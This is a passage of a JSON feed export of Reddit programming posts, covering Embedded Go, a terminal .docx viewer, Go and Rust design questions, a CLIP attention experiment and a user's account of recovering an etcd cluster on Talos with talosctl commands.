2, Nintendo 64","url":"https://www.reddit.com/r/golang/comments/1mt3s73/embedded_go_as_a_toolchain_pi_pico_2_nintendo_64/","date":1755467557,"author":"/u/michalderkacz","guid":230709,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/golang/comments/1mt3s73/embedded_go_as_a_toolchain_pi_pico_2_nintendo_64/\"> <img src=\"https://external-preview.redd.it/de5MiwVfyghCsMiV_dgH253Bs_0IMm-h55N0C6A36m8.jpeg?width=320&amp;crop=smart&amp;auto=webp&amp;s=8b1e405d829d00b74e914dbf801a8518d2ce2a21\" alt=\"Embedded Go as a toolchain, Pi Pico 2, Nintendo 64\" title=\"Embedded Go as a toolchain, Pi Pico 2, Nintendo 64\" /> </a> </td><td> <!-- SC_OFF --><div class=\"md\"><p>The article describes the latest changes in the Embedded Go. The most important things are:</p> <ol> <li><p>Installing Embedded Go as an additional Go toolchain.</p></li> <li><p>Support for Raspberry Pi Pico 2 and Nintendo 64.</p></li> </ol> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/michalderkacz\"> /u/michalderkacz </a> <br/> <span><a href=\"https://embeddedgo.github.io/2025/08/17/news.html\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1mt3s73/embedded_go_as_a_toolchain_pi_pico_2_nintendo_64/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"ORYX - TUI for sniffing network traffic using eBPF","url":"https://www.reddit.com/r/linux/comments/1mt2ha3/oryx_tui_for_sniffing_network_traffic_using_ebpf/","date":1755464401,"author":"/u/notpythops","guid":231431,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Github: <a href=\"https://github.com/pythops/oryx\">https://github.com/pythops/oryx</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/notpythops\"> /u/notpythops </a> <br/> <span><a href=\"https://i.redd.it/paq69seq8njf1.png\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1mt2ha3/oryx_tui_for_sniffing_network_traffic_using_ebpf/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is the *Nom* crate a good option for parsing a complex syntax? It seems like a really promising rust parsing library, if you have any experience with it please share it.","url":"https://www.reddit.com/r/rust/comments/1mt1kf1/is_the_nom_crate_a_good_option_for_parsing_a/","date":1755462245,"author":"/u/JKasonB","guid":231419,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Secure Boot, TPM and Anti-Cheat Engines","url":"https://www.reddit.com/r/programming/comments/1mt05nb/secure_boot_tpm_and_anticheat_engines/","date":1755458932,"author":"/u/tapo","guid":230700,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/tapo\"> /u/tapo </a> <br/> <span><a href=\"https://andrewmoore.ca/blog/post/anticheat-secure-boot-tpm/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1mt05nb/secure_boot_tpm_and_anticheat_engines/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] Injecting self doubt in the CoT of reasoning models","url":"https://www.reddit.com/r/MachineLearning/comments/1mszuyb/d_injecting_self_doubt_in_the_cot_of_reasoning/","date":1755458247,"author":"/u/ApartmentEither4838","guid":230723,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/ApartmentEither4838\"> /u/ApartmentEither4838 </a>","contentLength":42,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"What type of projects to professional Rust devs do?","url":"https://www.reddit.com/r/rust/comments/1msyvjz/what_type_of_projects_to_professional_rust_devs_do/","date":1755456030,"author":"/u/IHaveQuestions_42069","guid":230760,"unread":true,"content":"<p>Looking into a career change and Rust always fascinated me + it seemed like a great language to strengthen my understanding of lower-level programming (background is Data engineering in Snowflake / SQL / Python + a bit of Java, Javascript, &amp; Go)</p><p>I'm trying to understand, what work gets done in Rust? what industries are demanding it? what type of projects to company's want in Rust? </p><p>Asking as I can try to orient myself as I start getting into it more</p>","contentLength":451,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Just released doxx – a terminal .docx viewer inspired by Charm's glow package","url":"https://www.reddit.com/r/rust/comments/1msyntz/just_released_doxx_a_terminal_docx_viewer/","date":1755455537,"author":"/u/Effective_Title1224","guid":230699,"unread":true,"content":"<p>I got tired of open file.docx → wait 8 seconds → close Word just to read a document, so I built a terminal-native Word viewer!</p><ul><li>View  files directly in your terminal with (mostly) proper formatting</li><li>Tables actually look like tables (with Unicode borders!)</li><li>Nested lists work correctly with indentation</li><li>Full-text search with highlighting</li><li>Copy content straight to clipboard with </li><li>Export to markdown/CSV/JSON</li></ul><p>Working on servers over SSH, I constantly hit Word docs I needed to check quickly. The existing solutions I'm aware of either strip all formatting (docx2txt) or require GUI apps. Wanted something that felt as polished as <a href=\"https://github.com/charmbracelet/glow\">glow</a> but for Word documents.</p><ul><li>50ms startup vs Word's 8+ seconds</li><li>Works over SSH (obviously)</li><li>Preserves document structure and formatting</li><li>Smart table alignment based on data types</li><li>Interactive outline view for long docs</li></ul><p>Built with Rust + ratatui and heavily inspired by Charm's <a href=\"https://github.com/charmbracelet/glow\">glow</a> package for viewing Markdown in the CLI (built in Go)!</p><pre><code># Install cargo install --git https://github.com/bgreenwell/doxx # Use doxx quarterly-report.docx </code></pre><p>Still early but handles most Word docs I throw at it. Always wanted a proper Word viewer in my terminal toolkit alongside , , and friends. Let me know what you think!</p>","contentLength":1211,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"You can just build things","url":"https://www.reddit.com/r/programming/comments/1msxjqq/you_can_just_build_things/","date":1755453013,"author":"/u/rozenmd","guid":231686,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/rozenmd\"> /u/rozenmd </a> <br/> <span><a href=\"https://maxrozen.com/onlineornot-diaries-25-you-can-just-build-things\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1msxjqq/you_can_just_build_things/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"I was recently given these manuals and decided to give them a try. I hope I'm up to date.","url":"https://www.reddit.com/r/linux/comments/1msxhj7/i_was_recently_given_these_manuals_and_decided_to/","date":1755452877,"author":"/u/inguinha","guid":230674,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/inguinha\"> /u/inguinha </a> <br/> <span><a href=\"https://i.redd.it/tx8kitsf9mjf1.jpeg\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1msxhj7/i_was_recently_given_these_manuals_and_decided_to/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] Bing Search API is Retiring - What’s Your Next Move?","url":"https://www.reddit.com/r/MachineLearning/comments/1msw9vd/r_bing_search_api_is_retiring_whats_your_next_move/","date":1755450108,"author":"/u/4yush01","guid":230648,"unread":true,"content":"<p>I just learned that the Bing Search API is being retired, and now I'm feeling a bit anxious. I've integrated it into a couple of my projects, one is a chatbot and the other is a lightweight research tool. It has been “good enough” for my needs so far, but now I need to find a replacement before things start to break. Here are the options I'm considering:</p><ol><li><p>Switch to another major provider (though I'm not thrilled about the cost and terms).</p></li><li><p>Build my own search stack (which might be overkill for what I need).</p></li><li><p>Try one of the newer AI-native search APIs and see if they are ready for production.</p></li></ol><p>If you've already transitioned away from Bing, what did you switch to, and how is it performing? It seems like this change will create a significant gap for developers and AI builders.</p>","contentLength":780,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"oomprof: OOM time eBPF memory profiler for Go","url":"https://www.reddit.com/r/golang/comments/1msvuzg/oomprof_oom_time_ebpf_memory_profiler_for_go/","date":1755449146,"author":"/u/gnurizen","guid":230650,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/golang/comments/1msvuzg/oomprof_oom_time_ebpf_memory_profiler_for_go/\"> <img src=\"https://external-preview.redd.it/P3eigTjDjf-02KQ-gQWL-N8rMx6R4XUbsWededg802Q.png?width=640&amp;crop=smart&amp;auto=webp&amp;s=1f6994263299c7e18d50e623fcdd292042631c58\" alt=\"oomprof: OOM time eBPF memory profiler for Go\" title=\"oomprof: OOM time eBPF memory profiler for Go\" /> </a> </td><td> <!-- SC_OFF --><div class=\"md\"><p><a href=\"https://github.com/parca-dev/oomprof\">https://github.com/parca-dev/oomprof</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/gnurizen\"> /u/gnurizen </a> <br/> <span><a href=\"https://www.polarsignals.com/blog/posts/2025/08/13/oomprof\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1msvuzg/oomprof_oom_time_ebpf_memory_profiler_for_go/\">[comments]</a></span> </td></tr></table>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"MS-DOS Development Resources","url":"https://www.reddit.com/r/programming/comments/1msuz6g/msdos_development_resources/","date":1755447092,"author":"/u/mariuz","guid":230657,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/mariuz\"> /u/mariuz </a> <br/> <span><a href=\"https://github.com/SuperIlu/DOSDevelResources/blob/main/README.md\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1msuz6g/msdos_development_resources/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Andrea Griffini: C++ metaprogramming sucks","url":"https://www.reddit.com/r/programming/comments/1msuso1/andrea_griffini_c_metaprogramming_sucks/","date":1755446667,"author":"/u/segv","guid":230647,"unread":true,"content":"&#32; submitted by &#32; <a href=\"https://www.reddit.com/user/segv\"> /u/segv </a> <br/> <span><a href=\"https://www.youtube.com/watch?v=xfkwepKNjmI\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/programming/comments/1msuso1/andrea_griffini_c_metaprogramming_sucks/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] Bing Search API is Retiring - What’s Your Next Move?","url":"https://www.reddit.com/r/MachineLearning/comments/1msupcu/r_bing_search_api_is_retiring_whats_your_next_move/","date":1755446458,"author":"/u/4yush01","guid":230608,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Dual-Stack Setup in K8s using Cilium","url":"https://www.reddit.com/r/kubernetes/comments/1msujnd/dualstack_setup_in_k8s_using_cilium/","date":1755446085,"author":"/u/niterg","guid":230604,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Has anyone ever tried setting up dual stack kubernetes allowing both IPv4 and IPv6 network communication within private network?? I tried setting it up but had some trouble doing so, and there weren&#39;t much documentation for CNI manifests. Can someone help??</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/niterg\"> /u/niterg </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1msujnd/dualstack_setup_in_k8s_using_cilium/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1msujnd/dualstack_setup_in_k8s_using_cilium/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Uber FX dependency injection based application framework","url":"https://www.reddit.com/r/golang/comments/1mstqp7/uber_fx_dependency_injection_based_application/","date":1755444194,"author":"/u/ByteNinja2001","guid":230612,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hi, I am new to the the uber fx. In my company, they are using that. It&#39;s seems hard to understand the working principles. Can anyone please share some resources to learn uber fx frame work?</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/ByteNinja2001\"> /u/ByteNinja2001 </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1mstqp7/uber_fx_dependency_injection_based_application/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1mstqp7/uber_fx_dependency_injection_based_application/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Videos in the terminal with braille","url":"https://www.reddit.com/r/linux/comments/1mstiax/videos_in_the_terminal_with_braille/","date":1755443645,"author":"/u/Ok-Mushroom-8245","guid":230649,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Hey all, hacked together this project to use braille characters with persistence of vision to change the color of each individual dot and use that to display videos with ffmpeg. You can check out the code <a href=\"https://github.com/ashfn/brailleframe\">here</a> if you&#39;re interested.</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Ok-Mushroom-8245\"> /u/Ok-Mushroom-8245 </a> <br/> <span><a href=\"https://i.redd.it/r7u2usb7jljf1.gif\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1mstiax/videos_in_the_terminal_with_braille/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"When to use interfaces vs structs in a logistics simulation","url":"https://www.reddit.com/r/golang/comments/1mstgxs/when_to_use_interfaces_vs_structs_in_a_logistics/","date":1755443557,"author":"/u/VastDesign9517","guid":230613,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>I&#39;m building a resource management simulation (think Factorio logistics) to learn Go concepts like interfaces, channels, and goroutines. I&#39;ve built the basic systems but I&#39;m struggling with when to use interfaces vs keeping everything as concrete structs.</p> <p><strong>The System:</strong></p> <ul> <li>Resource nodes (copper, iron) with 3 miners each that extract materials</li> <li>Train loaders that collect from miners and call trains when full (like requestor chests)</li> <li>Trains dedicated to specific resource tracks that transport materials</li> <li>Factories that request multiple resources and can send signals to under/overclock production based on supply</li> <li>All coordination happens through Go channels - no central controller</li> </ul> <p>Right now I have working systems built, but I&#39;m trying to figure out when to reach for an interface.</p> <p>This is my current understanding: Resources{struct} [Interface] Miner{struct} [Interface] TrainLoader{struct} [Interface] Train{struct}</p> <p>I think interfaces let you define contracts that different structs can fulfill - a flexible way to pass behavior between components. I know I could look for common behavior across domains and create something like a <code>Loader</code> interface. But isn&#39;t there a danger in premature interface implementation?</p> <p>I feel like if you can foresee future codebase requirements, interfaces would be insanely useful. But I&#39;m not there yet.</p> <p>Thanks for reading and your help would be appreciated</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/VastDesign9517\"> /u/VastDesign9517 </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1mstgxs/when_to_use_interfaces_vs_structs_in_a_logistics/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1mstgxs/when_to_use_interfaces_vs_structs_in_a_logistics/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"my take on contextual error handling","url":"https://www.reddit.com/r/golang/comments/1mssuj2/my_take_on_contextual_error_handling/","date":1755442064,"author":"/u/sittingInAC0rner","guid":230611,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>Inspired by some great Go libraries, I built crumbs, my take on contextual error handling. It adds key-value pairs to your errors for easier debugging. Just a fun detour I had this weekend.</p> <p><a href=\"https://github.com/sri-shubham/crumbs\">https://github.com/sri-shubham/crumbs</a></p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/sittingInAC0rner\"> /u/sittingInAC0rner </a> <br/> <span><a href=\"https://www.reddit.com/r/golang/comments/1mssuj2/my_take_on_contextual_error_handling/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/golang/comments/1mssuj2/my_take_on_contextual_error_handling/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Autonomous Agents Crawling the Web + Recall-Style Browser Encyclopedia = Research Superpowers - and New Challenges","url":"https://www.getrecall.ai/?t=mattwolfe","date":1755440889,"author":"/u/Seithik","guid":231505,"unread":true,"content":"<section><div><h2>Your self-organizing knowledge base, where you can summarize and chat with any online content.</h2></div></section>","contentLength":94,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/artificial/comments/1mssci2/autonomous_agents_crawling_the_web_recallstyle/"},{"title":"A story on how talos saved my bacon yesterday","url":"https://www.reddit.com/r/kubernetes/comments/1mss9b3/a_story_on_how_talos_saved_my_bacon_yesterday/","date":1755440670,"author":"/u/miran248","guid":230605,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>TLDR: i broke (and recovered) the etcd cluster during upscale! </p> <p>Yesterday, late evening, after a couple of beers, i decided now would be a good time to deploy the <a href=\"https://www.kubeshark.co\">kubeshark</a> again, to see how the traffic flows between the services.<br/> At first it was all fine, until i noticed my pods were getting oom&#39;d at random - my setup was 3+3 (2vcpu, 4gb), barely enough.<br/> As every sane person, i decided now (10pm) would be a good time to upscale the machines, and so i did.<br/> In addition to the existing setup, i added 3+3 additional machines (4vcpu, 8gb) and as expected, oom errors went away. </p> <p>Now to the fuckup - once machines were ready, i went and removed them, one by one, only to remember at the end, you must first <a href=\"https://www.talos.dev/v1.10/talos-guides/howto/scaling-down/\">reset the nodes</a>, before you remove them!<br/> No worries, talos discovery service will just do it for me (after 30 mins) and i&#39;ll just remove the remaining Node objects using k9s - what could possibly go wrong, eh?<br/> Well, after 30 mins, when i was removing them, i realized they weren&#39;t getting removed, not only that but pods were not getting scheduled either - it happened, i bricked the etcd cluster, for the very first time! </p> <p>After a brief investigation, i realized, i essentially had three control plane nodes, with no members and leaders!<br/> ```</p> <blockquote> <p>TALOSCONFIG=talos-config talosctl -n c1,c2,c3 get machinetype NODE NAMESPACE TYPE ID VERSION TYPE c1 config MachineType machine-type 2 controlplane c2 config MachineType machine-type 2 controlplane c3 config MachineType machine-type 2 controlplane TALOSCONFIG=talos-config talosctl -n c1 etcd members error getting members: 1 error occurred: * c1: rpc error: code = Unknown desc = etcdserver: no leader TALOSCONFIG=talos-config talosctl -n c1 etcd status NODE MEMBER DB SIZE IN USE LEADER RAFT INDEX RAFT TERM RAFT APPLIED INDEX LEARNER ERRORS c1 fa82fdf38cbc37cf 26 MB 24 MB (94.46%) 0000000000000000 900656 3 900656 false etcdserver: no leader TALOSCONFIG=talos-config talosctl -n c1,c2,c3 service etcd NODE c1 ID etcd STATE Running HEALTH Fail LAST HEALTH MESSAGE context deadline exceeded EVENTS [Running]: Health check failed: context deadline exceeded (55m25s ago) [Running]: Health check successful (57m40s ago) [Running]: Health check failed: etcdserver: rpc not supported for learner (1h3m31s ago) [Running]: Started task etcd (PID 5101) for container etcd (1h3m45s ago) [Preparing]: Creating service runner (1h3m45s ago) [Preparing]: Running pre state (1h11m59s ago) [Waiting]: Waiting for etcd spec (1h12m2s ago) [Waiting]: Waiting for service &quot;cri&quot; to be &quot;up&quot;, etcd spec (1h12m3s ago) [Waiting]: Waiting for volume &quot;/var/lib&quot; to be mounted, volume &quot;ETCD&quot; to be mounted, service &quot;cri&quot; to be &quot;up&quot;, time sync, network, etcd spec (1h12m4s ago) [Starting]: Starting service (1h12m4s ago) NODE c2 ID etcd STATE Running HEALTH Fail LAST HEALTH MESSAGE context deadline exceeded EVENTS [Running]: Health check failed: context deadline exceeded (55m28s ago) [Running]: Health check successful (1h3m43s ago) [Running]: Health check failed: etcdserver: rpc not supported for learner (1h12m1s ago) [Running]: Started task etcd (PID 2520) for container etcd (1h12m8s ago) [Preparing]: Creating service runner (1h12m8s ago) [Preparing]: Running pre state (1h12m18s ago) [Waiting]: Waiting for etcd spec (1h12m18s ago) [Waiting]: Waiting for service &quot;cri&quot; to be &quot;up&quot;, etcd spec (1h12m19s ago) [Waiting]: Waiting for volume &quot;/var/lib&quot; to be mounted, volume &quot;ETCD&quot; to be mounted, service &quot;cri&quot; to be &quot;up&quot;, time sync, network, etcd spec (1h12m20s ago) [Starting]: Starting service (1h12m20s ago) NODE c3 ID etcd STATE Preparing HEALTH ? EVENTS [Preparing]: Running pre state (20m7s ago) [Waiting]: Waiting for service &quot;cri&quot; to be &quot;up&quot; (20m8s ago) [Waiting]: Waiting for volume &quot;/var/lib&quot; to be mounted, volume &quot;ETCD&quot; to be mounted, service &quot;cri&quot; to be &quot;up&quot;, time sync, network, etcd spec (20m9s ago) [Starting]: Starting service (20m9s ago) ``` </p> </blockquote> <p>Just as i was about to give up (as i had no backups), i remembered <code>talosctl</code> offers <a href=\"https://www.talos.dev/v1.10/advanced/disaster-recovery/#snapshotting-etcd-database\">etcd snapshots</a>, which, thankfully also worked on a broken setup!<br/> Made a snapshot of <code>c1</code> (state was <code>Running</code>), applied it on <code>c3</code> (state was <code>Preparing</code>) and after a few mins c3 was working and etcd had one member!<br/> ```</p> <blockquote> <p>TALOSCONFIG=talos-config talosctl -n c1 etcd snapshot c1-etcd.snapshot etcd snapshot saved to &quot;c1-etcd.snapshot&quot; (25591840 bytes) snapshot info: hash b23e4695, revision 775746, total keys 7826, total size 25591808 TALOSCONFIG=talos-config talosctl -n c3 bootstrap --recover-from c1-etcd.snapshot recovering from snapshot &quot;c1-etcd.snapshot&quot;: hash b23e4695, revision 775746, total keys 7826, total size 25591808 TALOSCONFIG=talos-config talosctl -n c3 etcd status NODE MEMBER DB SIZE IN USE LEADER RAFT INDEX RAFT TERM RAFT APPLIED INDEX LEARNER ERRORS c3 32e8e09b96c3e320 27 MB 27 MB (100.00%) 32e8e09b96c3e320 971 2 971 false<br/> TALOSCONFIG=talos-config talosctl -n c3 etcd members NODE ID HOSTNAME PEER URLS CLIENT URLS LEARNER c3 32e8e09b96c3e320 sgn3-nbg-control-plane-6 https://[2a01:4f8:1c1a:xxxx::1]:2380,https://[2a01:4f8:1c1a:xxxx::6ad4]:2380 https://[2a01:4f8:1c1a:xxxx::1]:2379 false ``` </p> </blockquote> <p>Then i performed the reset on <code>c1</code> and <code>c2</code>, and a few mins later my cluster was finally back up and running!<br/> ```</p> <blockquote> <p>TALOSCONFIG=talos-config talosctl -n c1,c2 reset --graceful=false --reboot --system-labels-to-wipe=EPHEMERAL TALOSCONFIG=talos-config talosctl -n c1,c2,c3 etcd status NODE MEMBER DB SIZE IN USE LEADER RAFT INDEX RAFT TERM RAFT APPLIED INDEX LEARNER ERRORS c1 85fc5f418bc411d8 29 MB 8.4 MB (29.16%) 32e8e09b96c3e320 267117 2 267117 false<br/> c2 b6e64eaa17d409e2 29 MB 8.4 MB (29.11%) 32e8e09b96c3e320 267117 2 267117 false<br/> c3 32e8e09b96c3e320 29 MB 8.4 MB (29.10%) 32e8e09b96c3e320 267117 2 267117 false<br/> TALOSCONFIG=talos-config talosctl -n c3 etcd members NODE ID HOSTNAME PEER URLS CLIENT URLS LEARNER c3 85fc5f418bc411d8 sgn3-nbg-control-plane-4 https://[2a01:4f8:1c1e:xxxx::1]:2380,https://[2a01:4f8:1c1e:xxxx::4461]:2380 https://[2a01:4f8:1c1e:xxxx::1]:2379 false c3 32e8e09b96c3e320 sgn3-nbg-control-plane-6 https://[2a01:4f8:1c1a:xxxx::1]:2380,https://[2a01:4f8:1c1a:xxxx::6ad4]:2380 https://[2a01:4f8:1c1a:xxxx::1]:2379 false c3 b6e64eaa17d409e2 sgn3-nbg-control-plane-5 https://[2a01:4f8:1c1a:xxxx::1]:2380,https://[2a01:4f8:1c1a:xxxx::1968]:2380 https://[2a01:4f8:1c1a:xxxx::1]:2379 false TALOSCONFIG=talos-config talosctl -n c1,c2,c3 service etcd NODE c1 ID etcd STATE Running HEALTH OK EVENTS [Running]: Health check successful (1m33s ago) [Running]: Health check failed: etcdserver: rpc not supported for learner (3m51s ago) [Running]: Started task etcd (PID 2480) for container etcd (3m58s ago) [Preparing]: Creating service runner (3m58s ago) [Preparing]: Running pre state (4m7s ago) [Waiting]: Waiting for service &quot;cri&quot; to be &quot;up&quot; (4m7s ago) [Waiting]: Waiting for volume &quot;/var/lib&quot; to be mounted, volume &quot;ETCD&quot; to be mounted, service &quot;cri&quot; to be &quot;up&quot;, time sync, network, etcd spec (4m8s ago) [Starting]: Starting service (4m8s ago) NODE c2 ID etcd STATE Running HEALTH OK EVENTS [Running]: Health check successful (6m5s ago) [Running]: Health check failed: etcdserver: rpc not supported for learner (8m20s ago) [Running]: Started task etcd (PID 2573) for container etcd (8m30s ago) [Preparing]: Creating service runner (8m30s ago) [Preparing]: Running pre state (8m43s ago) [Waiting]: Waiting for service &quot;cri&quot; to be &quot;up&quot; (8m43s ago) [Waiting]: Waiting for volume &quot;/var/lib&quot; to be mounted, volume &quot;ETCD&quot; to be mounted, service &quot;cri&quot; to be &quot;up&quot;, time sync, network, etcd spec (8m44s ago) [Starting]: Starting service (8m44s ago) NODE c3 ID etcd STATE Running HEALTH OK EVENTS [Running]: Health check successful (16m32s ago) [Running]: Started task etcd (PID 2692) for container etcd (16m37s ago) [Preparing]: Creating service runner (16m37s ago) [Preparing]: Running pre state (16m37s ago) [Waiting]: Waiting for volume &quot;/var/lib&quot; to be mounted, volume &quot;ETCD&quot; to be mounted, service &quot;cri&quot; to be &quot;up&quot;, time sync, network, etcd spec (16m37s ago) [Starting]: Starting service (16m37s ago) ``` </p> </blockquote> <p>Been using talos for almost two years now and this was my scariest encounter so far - must say the recovery was surprisingly straightforward, once i knew what to do!</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/miran248\"> /u/miran248 </a> <br/> <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mss9b3/a_story_on_how_talos_saved_my_bacon_yesterday/\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/kubernetes/comments/1mss9b3/a_story_on_how_talos_saved_my_bacon_yesterday/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is Econometrics a good background to get into Machine Learning? [D]","url":"https://www.reddit.com/r/MachineLearning/comments/1msrdfq/is_econometrics_a_good_background_to_get_into/","date":1755438433,"author":"/u/gaytwink70","guid":230638,"unread":true,"content":"<div><p>I have an econometrics and data analytics bachelors degree and im looking to get into a masters of artificial intelligence.</p><p>I have also taken some introductory math courses and introductory programming/algorithms as well as deep learning.</p><p>How relevant is my background if I wanna get into AI/ML research later on? (I am hoping to do a PhD afterwards in AI/ML)</p></div>   submitted by   <a href=\"https://www.reddit.com/user/gaytwink70\"> /u/gaytwink70 </a>","contentLength":390,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"AI vibes over time","url":"https://www.reddit.com/r/artificial/comments/1msqv3g/ai_vibes_over_time/","date":1755437111,"author":"/u/katxwoods","guid":230610,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[P] Confused results while experimenting with attention modules on CLIP RN50 for image classification","url":"https://www.reddit.com/r/MachineLearning/comments/1msq0uf/p_confused_results_while_experimenting_with/","date":1755434878,"author":"/u/Intrepid-Purpose2151","guid":230570,"unread":true,"content":"<p>I’m currently working on an audio-visual project. As a first step, I’m building unimodal models before moving on to the multimodal stage. For the vision part, I started with CLIP RN50 as the backbone and fine-tuned only the classification layer. With that setup, I was able to reach around 84% accuracy on my dataset.</p><p>To push performance, I experimented with adding attention modules:</p><p>With CBAM (Convolutional Block Attention Module), accuracy improved to 89%.</p><p>With SENet (Squeeze-and-Excitation Network), I surprisingly got an even better result: 93%.</p><p>My understanding was that CBAM, which combines both channel + spatial attention, should typically give a stronger boost than SENet, which only does channel attention. But in my experiments, the opposite happened.</p><p>Am I missing something obvious here? Could this be due to dataset characteristics, training setup, or how I integrated CBAM into CLIP?</p><p>Would really appreciate any insights, especially from people who have tried attention modules on CLIP or ResNet backbones.</p>","contentLength":1021,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Sudo reference in The Simpsons","url":"https://www.reddit.com/r/linux/comments/1msprgk/sudo_reference_in_the_simpsons/","date":1755434148,"author":"/u/Blackbird_song13","guid":230571,"unread":true,"content":"<!-- SC_OFF --><div class=\"md\"><p>&quot;The Girl Code&quot;, S27E10</p> </div><!-- SC_ON --> &#32; submitted by &#32; <a href=\"https://www.reddit.com/user/Blackbird_song13\"> /u/Blackbird_song13 </a> <br/> <span><a href=\"https://i.redd.it/gpkok9qdqkjf1.png\">[link]</a></span> &#32; <span><a href=\"https://www.reddit.com/r/linux/comments/1msprgk/sudo_reference_in_the_simpsons/\">[comments]</a></span>","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Yet another Kubernetes Desktop Client","url":"https://www.reddit.com/r/kubernetes/comments/1msp07s/yet_another_kubernetes_desktop_client/","date":1755431900,"author":"/u/askoma","guid":230567,"unread":true,"content":"<table> <tr><td> <a href=\"https://www.reddit.com/r/kubernetes/comments/1msp07s/yet_another_kubernetes_desktop_client/\"> <img src=\"https://external-preview.redd.it/BvBBAhG5ChsTNOxDRkVZ7DkmtE-XROgFTl0m7d2RWv8.png?width=640&amp;crop=smart&amp;auto=webp&amp;s=a2fbb0c237747776975ff1976bda08b0767d936b\" alt=\"Yet another Kubernetes Desktop Client\" title=\"Yet another Kubernetes Desktop Client\" /> </a> </td><td> <!-- SC_OFF --><div class=\"md\"><p>Hey! I write a project for fun and want to share with you, it’s a kubernetes desktop client built with tauri and kube.rs. 